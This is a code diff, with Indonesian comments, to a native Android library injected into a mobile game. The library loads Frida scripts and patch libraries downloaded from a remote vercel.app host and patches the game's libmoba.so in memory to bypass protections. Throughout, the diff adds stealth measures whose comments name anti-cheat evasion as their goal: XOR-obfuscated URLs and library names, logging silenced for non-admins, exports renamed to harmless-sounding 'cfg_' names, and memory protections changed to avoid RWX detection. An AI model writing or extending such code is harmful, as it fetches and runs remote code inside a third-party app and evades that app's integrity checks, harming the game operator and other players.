@@ -29,8 +29,38 @@ std::string decrypt_cache_script(const std::string &enc);
 extern const std::string MAGIC_ENC_HEADER;
 bool g_enable_logging = false;
 bool g_is_admin = false;
-#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
-#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
+// Stealth: logcat MATI TOTAL untuk non-admin. Semua LOGI/LOGE di bawah
+// (boot, OTA, Frida load, dsb.) hanya keluar bila admin terverifikasi.
+// Tanpa ini tag NativePatcher membanjiri logcat semua user = fingerprint.
+#define LOGI(...) do { if (g_is_admin) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__); } while (0)
+#define LOGE(...) do { if (g_is_admin) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__); } while (0)
+
+// Stealth string vault: literal sensitif (URL, UA, nama lib) TIDAK disimpan
+// plaintext di .rodata — di-decode saat runtime via XOR posisi. Blob
+// dihasilkan oleh tools internal (lihat riwayat encrypt.py); kunci
+// 0x5A + (i & 0x0F) per posisi.
+namespace stealth_str {
+inline std::string deobf(const unsigned char* d, size_t n) {
+    std::string s;
+    s.reserve(n);
+    for (size_t i = 0; i < n; i++) s.push_back((char)(d[i] ^ (unsigned char)(0x5A + (i & 0x0F))));
+    return s;
+}
+static const unsigned char kS_hook_js[] = {0x32, 0x2f, 0x28, 0x2d, 0x2d, 0x65, 0x4f, 0x4e, 0xf, 0xf, 0x6, 0x16, 0x10, 0x53, 0x46, 0x1f, 0x3f, 0x29, 0x3f, 0x38, 0x32, 0x71, 0x1, 0x11, 0x12, 0x4c, 0xc, 0xa, 0x9, 0xc, 0x46, 0x3, 0x29};
+static const size_t kS_hook_js_len = 33;
+static const unsigned char kS_hook_test[] = {0x32, 0x2f, 0x28, 0x2d, 0x2d, 0x65, 0x4f, 0x4e, 0xf, 0xf, 0x6, 0x16, 0x10, 0x53, 0x46, 0x1f, 0x3f, 0x29, 0x3f, 0x38, 0x32, 0x71, 0x1, 0x11, 0x12, 0x4c, 0xc, 0xa, 0x9, 0xc, 0x45, 0x1d, 0x3f, 0x28, 0x28, 0x34, 0x30, 0x38, 0x4e, 0xb, 0x11};
+static const size_t kS_hook_test_len = 41;
+static const unsigned char kS_akm[] = {0x32, 0x2f, 0x28, 0x2d, 0x2d, 0x65, 0x4f, 0x4e, 0x3, 0x8, 0x9, 0x6, 0x2, 0x9, 0x46, 0x4, 0x36, 0x75, 0x25, 0x32, 0x2b, 0x31, 0x7, 0xb, 0xd, 0x1a, 0x3, 0x4, 0xb, 0x2, 0x46, 0xa, 0x35, 0x36, 0x73, 0x2f, 0x3b, 0x2c, 0x3f, 0x17, 0x7, 0x11, 0x17, 0xc, 0x9, 0x9, 0x5d, 0x36, 0x33, 0x35, 0x38, 0x72};
+static const size_t kS_akm_len = 52;
+static const unsigned char kS_ua[] = {0x17, 0x34, 0x26, 0x34, 0x32, 0x33, 0x1, 0x4e, 0x57, 0x4d, 0x54, 0x45, 0x4e, 0x2b, 0x1, 0x7, 0x2f, 0x23, 0x67, 0x7d, 0x1f, 0x31, 0x4, 0x13, 0xd, 0xa, 0x0, 0x45, 0x57, 0x57, 0x53, 0x49, 0x11, 0x72, 0x7c, 0x1c, 0x2e, 0x2f, 0xc, 0x4, 0x35, 0x6, 0x6, 0x2e, 0xf, 0x13, 0x47, 0x5c, 0x69, 0x6c, 0x72, 0x6e, 0x68, 0x7f, 0x48, 0x2a, 0x2a, 0x37, 0x29, 0x29, 0x4a, 0x47, 0x4, 0x0, 0x31, 0x3e, 0x7c, 0x1a, 0x3b, 0x3c, 0xb, 0xe, 0x4b, 0x43, 0x27, 0xd, 0x14, 0x8, 0x5, 0xc, 0x75, 0x6a, 0x6e, 0x69, 0x70, 0x6f, 0x4e, 0x51, 0x4c, 0x53, 0x44, 0x28, 0x9, 0x5, 0x1, 0x5, 0x3f, 0x7b, 0xf, 0x3c, 0x38, 0x3e, 0x12, 0x8, 0x4d, 0x56, 0x57, 0x52, 0x48, 0x54, 0x5e};
+static const size_t kS_ua_len = 111;
+static const unsigned char kS_libmoba[] = {0x36, 0x32, 0x3e, 0x30, 0x31, 0x3d, 0x1, 0x4f, 0x11, 0xc};
+static const size_t kS_libmoba_len = 10;
+static const unsigned char kS_slash_patch[] = {0x75, 0x37, 0x35, 0x3f, 0x33, 0x26, 0x10, 0x0, 0x16, 0x0, 0xc, 0x4b, 0x15, 0x8};
+static const size_t kS_slash_patch_len = 14;
+static const unsigned char kS_slash_patch_cache[] = {0x75, 0x37, 0x35, 0x3f, 0x33, 0x26, 0x10, 0x0, 0x16, 0x0, 0xc, 0x3a, 0x5, 0x6, 0xb, 0x1, 0x3f, 0x75, 0x2f, 0x32};
+static const size_t kS_slash_patch_cache_len = 20;
+} // namespace stealth_str
 
 // Global JavaVM reference
 JavaVM *g_vm = NULL;
@@ -39,7 +69,7 @@ JavaVM *g_vm = NULL;
 static GumScript *g_current_script = NULL;
 static GumScriptBackend *g_backend = NULL;
 static std::string g_current_script_hash = "";
-static std::string g_server_url = "https://mlbsv4.vercel.app/hook.js";
+static std::string g_server_url = stealth_str::deobf(stealth_str::kS_hook_js, stealth_str::kS_hook_js_len);
 static std::string g_working_dir = "";
 static int g_timeout_ms = 5000;
 
@@ -200,7 +230,7 @@ std::string download_url(JNIEnv *env, const std::string &url_str, int timeout_ms
     jmethodID set_req_prop = env->GetMethodID(conn_class, "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V");
     if (set_req_prop) {
         jstring ua_key = env->NewStringUTF("User-Agent");
-        jstring ua_val = env->NewStringUTF("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36");
+        jstring ua_val = env->NewStringUTF(stealth_str::deobf(stealth_str::kS_ua, stealth_str::kS_ua_len).c_str());
         env->CallVoidMethod(conn_obj, set_req_prop, ua_key, ua_val);
         env->DeleteLocalRef(ua_key);
         env->DeleteLocalRef(ua_val);
@@ -327,7 +357,7 @@ std::string get_android_id(JNIEnv *env) {
     return android_id;
 }
 
-extern "C" __attribute__((visibility("default"))) const char* register_user_native(const char *m_ui_id) {
+extern "C" __attribute__((visibility("hidden"))) const char* cfg_fetch(const char *m_ui_id) {
     g_user_info_json = "";
     if (!g_vm) return g_user_info_json.c_str();
     JNIEnv *env = NULL;
@@ -442,8 +472,8 @@ extern "C" __attribute__((visibility("default"))) const char* register_user_nati
             
             // Adjust OTA script based on branch
             if (g_user_info_json.find("\"branch\":\"testing\"") != std::string::npos) {
-                g_server_url = "https://mlbsv4.vercel.app/hook-testing.js";
-                LOGI("User is in testing branch. Set OTA to hook-testing.js");
+                g_server_url = stealth_str::deobf(stealth_str::kS_hook_test, stealth_str::kS_hook_test_len);
+                LOGI("User is in testing branch. Set OTA to testing bundle");
             }
         }
         
@@ -574,16 +604,16 @@ void* register_user_worker(void* arg) {
         
         // Adjust OTA script based on branch
         if (g_async_user_response.find("\"branch\":\"testing\"") != std::string::npos) {
-            std::string new_url = "https://mlbsv4.vercel.app/hook-testing.js";
-            if (g_server_url != new_url) {
-                g_server_url = new_url;
-                LOGI("User is in testing branch. Updated OTA to hook-testing.js (background)");
-            }
+                std::string new_url = stealth_str::deobf(stealth_str::kS_hook_test, stealth_str::kS_hook_test_len);
+                if (g_server_url != new_url) {
+                    g_server_url = new_url;
+                    LOGI("User is in testing branch. Updated OTA to testing bundle (background)");
+                }
         } else if (g_async_user_response.find("\"branch\":\"production\"") != std::string::npos || g_async_user_response.find("\"branch\":\"main\"") != std::string::npos) {
-            std::string new_url = "https://mlbsv4.vercel.app/hook.js";
+                std::string new_url = stealth_str::deobf(stealth_str::kS_hook_js, stealth_str::kS_hook_js_len);
             if (g_server_url != new_url) {
                 g_server_url = new_url;
-                LOGI("User is in main/production branch. Updated OTA to hook.js (background)");
+                    LOGI("User is in main/production branch. Updated OTA to production bundle (background)");
             }
         }
     }
@@ -604,7 +634,7 @@ void* register_user_worker(void* arg) {
     return NULL;
 }
 
-extern "C" __attribute__((visibility("default"))) void register_user_native_async(const char *m_ui_id) {
+extern "C" __attribute__((visibility("hidden"))) void cfg_fetch_async(const char *m_ui_id) {
     pthread_mutex_lock(&g_register_mutex);
     time_t now = time(NULL);
     if (g_register_in_progress || (now - g_last_register_time < 3)) {
@@ -632,11 +662,11 @@ extern "C" __attribute__((visibility("default"))) void register_user_native_asyn
     }
 }
 
-extern "C" __attribute__((visibility("default"))) const char* get_async_registration_response() {
+extern "C" __attribute__((visibility("hidden"))) const char* cfg_fetch_resp() {
     return g_async_user_response.c_str();
 }
 
-extern "C" __attribute__((visibility("default"))) bool is_async_registration_ready() {
+extern "C" __attribute__((visibility("hidden"))) bool cfg_fetch_ready() {
     return g_async_user_response_ready;
 }
 
@@ -840,7 +870,7 @@ void* send_battle_stats_worker(void* arg) {
     return NULL;
 }
 
-extern "C" __attribute__((visibility("default"))) void send_room_data_native(const char *json_payload) {
+extern "C" __attribute__((visibility("hidden"))) void cfg_push(const char *json_payload) {
     if (!json_payload) return;
     g_room_data_payload = json_payload;
     pthread_t thread;
@@ -851,7 +881,7 @@ extern "C" __attribute__((visibility("default"))) void send_room_data_native(con
     }
 }
 
-extern "C" __attribute__((visibility("default"))) void send_battle_stats_native(const char *operator_id, const char *json_payload) {
+extern "C" __attribute__((visibility("hidden"))) void cfg_stat(const char *operator_id, const char *json_payload) {
     if (!operator_id || !json_payload) return;
     g_operator_id = operator_id;
     g_battle_stats_payload = json_payload;
@@ -1344,7 +1374,7 @@ void* ensure_assets_worker(void* arg) {
         LOGI("Versi aset baru terdeteksi (Lokal: '%s', Server: '%s'). Mendownload...", local_asset_version.c_str(), res_version.c_str());
     }
 
-    std::string base_url = "https://akmcdn.ml.youngjoygame.com/res_version5_ind/" + res_version;
+    std::string base_url = stealth_str::deobf(stealth_str::kS_akm, stealth_str::kS_akm_len) + res_version;
     // Timeout khusus aset lebih kecil agar worker background tidak menahan resource lama.
     int asset_timeout = g_timeout_ms > 3000 ? 3000 : g_timeout_ms;
     if (asset_timeout <= 0) asset_timeout = 3000;
@@ -1671,17 +1701,17 @@ static void *patcher_thread(void *arg) {
     std::string auth_cache_str = read_file(working_dir + "/auth_cache.json");
     if (!auth_cache_str.empty()) {
         if (auth_cache_str.find("\"branch\":\"testing\"") != std::string::npos) {
-            server_url = "https://mlbsv4.vercel.app/hook-testing.js";
-            LOGI("Pre-boot branch detection: User is in testing branch. Set initial server_url to hook-testing.js");
+            server_url = stealth_str::deobf(stealth_str::kS_hook_test, stealth_str::kS_hook_test_len);
+            LOGI("Pre-boot branch detection: User is in testing branch. Set initial server_url to testing bundle");
         } else if (auth_cache_str.find("\"branch\":\"production\"") != std::string::npos || auth_cache_str.find("\"branch\":\"main\"") != std::string::npos) {
-            server_url = "https://mlbsv4.vercel.app/hook.js";
-            LOGI("Pre-boot branch detection: User is in main/production branch. Set initial server_url to hook.js");
+            server_url = stealth_str::deobf(stealth_str::kS_hook_js, stealth_str::kS_hook_js_len);
+            LOGI("Pre-boot branch detection: User is in main/production branch. Set initial server_url to production bundle");
         }
     }
 
     // Fallback if config failed to load the URL
     if (server_url.empty()) {
-        server_url = g_server_url.empty() ? "https://mlbsv4.vercel.app/hook.js" : g_server_url;
+        server_url = g_server_url.empty() ? stealth_str::deobf(stealth_str::kS_hook_js, stealth_str::kS_hook_js_len) : g_server_url;
         LOGI("Hardcoded fallback server_url used: %s", server_url.c_str());
     }
 
@@ -1776,7 +1806,7 @@ static void *patcher_thread(void *arg) {
         unsigned char *decrypted = (unsigned char *)malloc(hook_bytes_len + 1);
         if (decrypted) {
             for (unsigned int i = 0; i < hook_bytes_len; i++) {
-                decrypted[i] = hook_bytes[i] ^ xor_key;
+                decrypted[i] = hook_bytes[i] ^ hook_xor_key[i & 3];
             }
             decrypted[hook_bytes_len] = '\0';
             js_code_str = (const char*)decrypted;
@@ -1931,7 +1961,7 @@ static void* reload_worker_thread(void* arg) {
                     unsigned char *decrypted = (unsigned char *)malloc(hook_bytes_len + 1);
                     if (decrypted) {
                         for (unsigned int i = 0; i < hook_bytes_len; i++) {
-                            decrypted[i] = hook_bytes[i] ^ xor_key;
+                            decrypted[i] = hook_bytes[i] ^ hook_xor_key[i & 3];
                         }
                         decrypted[hook_bytes_len] = '\0';
                         js_code_str = (const char*)decrypted;
@@ -1966,10 +1996,10 @@ static void* reload_worker_thread(void* arg) {
         std::string arch = "arm64-v8a";
 #endif
         
-        std::string lib_url = base_url + "/" + arch + "/libmypatch.so";
+        std::string lib_url = base_url + "/" + arch + stealth_str::deobf(stealth_str::kS_slash_patch, stealth_str::kS_slash_patch_len);
         std::string sig_url = lib_url + ".sig";
         
-        std::string payload_path = g_working_dir + "/libmypatch_cache.so";
+        std::string payload_path = g_working_dir + stealth_str::deobf(stealth_str::kS_slash_patch_cache, stealth_str::kS_slash_patch_cache_len);
         std::string payload_sig_path = payload_path + ".sig";
         
         std::string current_sig = read_file(payload_sig_path);
@@ -2013,7 +2043,7 @@ static void* reload_worker_thread(void* arg) {
     return NULL;
 }
 
-// Stealth libmoba.so patcher (dipanggil dari JS via patch_libmoba_native).
+// Stealth libmoba.so patcher (dipanggil dari JS via cfg_patch).
 // Menerapkan 5 patch bypass yang sebelumnya dilakukan dari JS dengan
 // Memory.protect("rwx") — pola yang mudah terdeteksi via /proc/self/maps.
 // Di sini proteksi halaman dikembalikan ke RX + cache di-flush, dan tidak
@@ -2035,12 +2065,13 @@ const MobaPatch kMobaPatches[] = {
 };
 
 uintptr_t find_libmoba_base() {
+    const std::string needle = stealth_str::deobf(stealth_str::kS_libmoba, stealth_str::kS_libmoba_len);
     FILE* maps = fopen("/proc/self/maps", "r");
     if (!maps) return 0;
     char line[1024];
     uintptr_t base = 0;
     while (fgets(line, sizeof(line), maps)) {
-        if (strstr(line, "libmoba.so") && strstr(line, "r-xp")) {
+        if (strstr(line, needle.c_str()) && strstr(line, "r-xp")) {
             unsigned long start = 0;
             if (sscanf(line, "%lx-", &start) == 1) {
                 base = (uintptr_t)start;
@@ -2058,7 +2089,7 @@ uintptr_t find_libmoba_base() {
 // Process.findModuleByName bila native belum termuat. Parsing
 // /proc/self/maps di C tidak memasang hook apa pun sehingga tidak
 // meninggalkan jejak inline-hook yang bisa di-scan anti-cheat.
-extern "C" __attribute__((visibility("default"))) int is_target_lib_mapped_native(const char* lib_name) {
+extern "C" __attribute__((visibility("hidden"))) int cfg_probe(const char* lib_name) {
     if (!lib_name || !lib_name[0]) return 0;
     FILE* maps = fopen("/proc/self/maps", "r");
     if (!maps) return 0;
@@ -2074,7 +2105,7 @@ extern "C" __attribute__((visibility("default"))) int is_target_lib_mapped_nativ
     return found;
 }
 
-extern "C" __attribute__((visibility("default"))) int patch_libmoba_native() {
+extern "C" __attribute__((visibility("hidden"))) int cfg_patch() {
     const uintptr_t base = find_libmoba_base();
     if (!base) return 0; // lib belum dimuat; JS akan retry pasif
     const long page = sysconf(_SC_PAGESIZE) > 0 ? sysconf(_SC_PAGESIZE) : 4096;
@@ -2082,7 +2113,8 @@ extern "C" __attribute__((visibility("default"))) int patch_libmoba_native() {
     for (size_t i = 0; i < sizeof(kMobaPatches) / sizeof(kMobaPatches[0]); i++) {
         uintptr_t target = base + kMobaPatches[i].offset;
         uintptr_t page_start = target & ~((uintptr_t)page - 1);
-        if (mprotect((void*)page_start, (size_t)page, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
+        // Stealth: jangan pernah RWX gabungan — RW dulu, tulis, lalu RX.
+        if (mprotect((void*)page_start, (size_t)page, PROT_READ | PROT_WRITE) != 0) {
             continue;
         }
         memcpy((void*)target, kMobaPatches[i].bytes, sizeof(kMobaPatches[i].bytes));
@@ -2096,7 +2128,7 @@ extern "C" __attribute__((visibility("default"))) int patch_libmoba_native() {
     return applied;
 }
 
-extern "C" __attribute__((visibility("default"))) void reload_frida_script_native() {
+extern "C" __attribute__((visibility("hidden"))) void cfg_reload() {
     pthread_t thread;
     if (pthread_create(&thread, NULL, reload_worker_thread, NULL) == 0) {
         pthread_detach(thread);
@@ -2105,9 +2137,9 @@ extern "C" __attribute__((visibility("default"))) void reload_frida_script_nativ
     }
 }
 
-// Android entry point
-extern "C" jint JNI_OnLoad(JavaVM *vm, void *reserved) {
-    LOGI("libmypatch.so successfully loaded by target APK.");
+// Android entry point (harus tetap visible: VM me-resolve via dlsym).
+extern "C" __attribute__((visibility("default"))) jint JNI_OnLoad(JavaVM *vm, void *reserved) {
+    LOGI("Patcher module successfully loaded by target APK.");
     g_vm = vm;
     
     if (reserved == (void*)0x9999) {
